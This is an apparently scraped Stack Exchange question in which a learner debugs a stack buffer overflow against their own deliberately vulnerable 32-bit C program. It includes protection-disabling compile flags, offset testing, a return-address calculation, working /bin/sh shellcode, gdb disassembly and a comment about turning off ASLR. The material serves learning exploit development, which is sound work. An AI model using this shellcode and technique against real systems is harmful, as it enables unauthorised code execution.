{
  "title": "Stack buffer overflow SIGSEGV help",
  "link": "https://reverseengineering.stackexchange.com/questions/16961/stack-buffer-overflow-sigsegv-help",
  "content": "I've been going at this for a couple of days now working through trial and error but I can't seem to pinpoint exactly why I'm still getting a SIGSEGV. \n\nHere's the stdout of me stepping through the stack buffer overflow with gdb/gef: https://hastebin.com/hunekowasi.bash\n\nThe source for the c bin i'm executing is:\n\n```\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv) {\n    char buf[256];\n\n    if (argc < 2) {\n        fprintf(stderr, \"ERROR: argc < 2\");\n        return 1;\n    }\n\n    strcpy(buf, argv[1]);\n    return 0;\n}\n\n```\nI compile it with:\n\n```\ngcc -g -Wall -fno-stack-protector -m32 -I. main.c -o overflow\n\n```\nThe machine im using has an 64 bit intel processor (little-endian), and I'm executing the ./overflow bin with this command:\n\nThe char array im trying to overflow is 256 bytes (appears to be 260 bytes i believe).\n\n0x080484ab <+69>:  lea    eax,[ebp-0x108]\n\nThis is verified when I intentionally try to segfault:\n\n```\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master⚡ \n⇒  ./overflow $(perl -e \"print 'A' x 256\")\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master⚡ \n⇒  ./overflow $(perl -e \"print 'A' x 260\")\n[1]    18410 segmentation fault (core dumped)  ./overflow $(perl -e \"print 'A' x 260\")\n\n```\nAfter verifying the segfault occurs at 260, I create my payload:\n\nI calculate for the jump by taking the beginning address of the buffer and adding 50 to it: 0xffff9cc0 + 50 giving 0xffff9c8e which I reverse since I'm on a little-endian system and that ends up being: \\x8e\\x9c\\xff\\xff.\n\nThe shellcode im using is the same shellcode i use in this source to verify it works on my system:\n\n```\n#include <stdio.h>\n#include <string.h>\n\nchar shellcode[] = {\n    \"\\x6a\\x0b\"                      /* push   0xb */\n    \"\\x58\"                          /* pop    eax */\n    \"\\x31\\xf6\"                      /* xor    esi,esi */\n    \"\\x56\"                          /* push   esi */\n    \"\\x68\\x2f\\x2f\\x73\\x68\"          /* push   0x68732f2f */\n    \"\\x68\\x2f\\x62\\x69\\x6e\"          /* push   0x6e69622f */\n    \"\\x89\\xe3\"                      /* mov    ebx,esp */\n    \"\\x31\\xc9\"                      /* xor    ecx,ecx */\n    \"\\x89\\xca\"                      /* mov    edx,ecx */\n    \"\\xcd\\x80\"                      /* int    0x80 */\n};\n\nint main()\n{\n    printf(\"Shellcode Length:  %d  \n\", (int)strlen(shellcode));\n    int (*ret)() = (int(*)())shellcode;\n    ret();\n    return 0;\n}\n\n```\nThough.. When i execute the bin passing it the crafted string, i get a SIGSEGV error. I've played around with it quite a bit and can't seem to get it to work. I feel like im missing something small. You can see the output from gdb in the hastebin link i provided above. \n\nedit - Adding some additional info that may be helpful.\n\n```\n@gef➤  checksec\n[+] checksec for '/home/th3v0id/repos/bufferoverflows/stack/01/overflow'\nCanary                        : No\nNX                            : No\nPIE                           : No\nFortify                       : No\nRelRO                         : Partial\n\n@gef➤  disassemble main\nDump of assembler code for function main:\n=> 0x08048466 <+0>: lea    ecx,[esp+0x4]\n   0x0804846a <+4>: and    esp,0xfffffff0\n   0x0804846d <+7>: push   DWORD PTR [ecx-0x4]\n   0x08048470 <+10>:    push   ebp\n   0x08048471 <+11>:    mov    ebp,esp\n   0x08048473 <+13>:    push   ecx\n   0x08048474 <+14>:    sub    esp,0x104\n   0x0804847a <+20>:    mov    eax,ecx\n   0x0804847c <+22>:    cmp    DWORD PTR [eax],0x1\n   0x0804847f <+25>:    jg     0x804849f <main+57>\n   0x08048481 <+27>:    mov    eax,ds:0x804a020\n   0x08048486 <+32>:    push   eax\n   0x08048487 <+33>:    push   0xf\n   0x08048489 <+35>:    push   0x1\n   0x0804848b <+37>:    push   0x8048554\n   0x08048490 <+42>:    call   0x8048330 <fwrite@plt>\n   0x08048495 <+47>:    add    esp,0x10\n   0x08048498 <+50>:    mov    eax,0x1\n   0x0804849d <+55>:    jmp    0x80484bf <main+89>\n   0x0804849f <+57>:    mov    eax,DWORD PTR [eax+0x4]\n   0x080484a2 <+60>:    add    eax,0x4\n   0x080484a5 <+63>:    mov    eax,DWORD PTR [eax]\n   0x080484a7 <+65>:    sub    esp,0x8\n   0x080484aa <+68>:    push   eax\n   0x080484ab <+69>:    lea    eax,[ebp-0x108]\n   0x080484b1 <+75>:    push   eax\n   0x080484b2 <+76>:    call   0x8048340 <strcpy@plt>\n   0x080484b7 <+81>:    add    esp,0x10\n   0x080484ba <+84>:    mov    eax,0x0\n   0x080484bf <+89>:    mov    ecx,DWORD PTR [ebp-0x4]\n   0x080484c2 <+92>:    leave  \n   0x080484c3 <+93>:    lea    esp,[ecx-0x4]\n   0x080484c6 <+96>:    ret    \nEnd of assembler dump.\n\n```\n",
  "votes": "1",
  "answers": 0,
  "views": "353",
  "tags": [
    "disassembly",
    "assembly",
    "binary-analysis",
    "gdb",
    "buffer-overflow"
  ],
  "user": "SelfTaught",
  "time": "Dec 13, 2017 at 21:44",
  "comments": [
    {
      "user": "sudhackar",
      "text": "What about ASLR? I'd advise against returning to stack addresses as they vary even with slight change in environment. look for useful \"gadgets\".",
      "time": null
    },
    {
      "user": "SelfTaught",
      "text": "Thanks @sudhackar Your comment helped me figure out the issue, it was aslr. At first I didn't think that was the issue because in gef when i checked aslr previously, it reported as disabled (maybe it disables aslr by default? - need to dig into this more). Anyways, cat /proc/sys/kernel/randomize_va_space output 2. set kernel.randomize_va_space = 0 in /etc/sysctl.cnf, did a reboot, and now it works when i run it outside of gef.",
      "time": null
    }
  ],
  "answers_data": []
}